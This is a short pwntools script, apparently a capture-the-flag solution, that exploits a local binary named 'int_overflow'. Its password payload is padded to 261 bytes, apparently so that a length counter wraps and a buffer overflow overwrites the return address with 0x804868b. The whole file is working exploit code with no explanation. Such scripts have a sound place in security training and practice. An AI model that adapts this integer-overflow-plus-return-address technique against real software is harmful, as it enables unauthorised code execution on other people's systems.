from pwn import *

p = process("./int_overflow")

p.sendlineafter("choice:","1")
p.sendlineafter("username:\n","YmCold")

cnt = 24

payload = ""
payload += "A"*24
payload += p32(0x804868b)
payload = payload.ljust(261,"A")

p.sendlineafter("passwd:\n",payload)
print p.recvall()

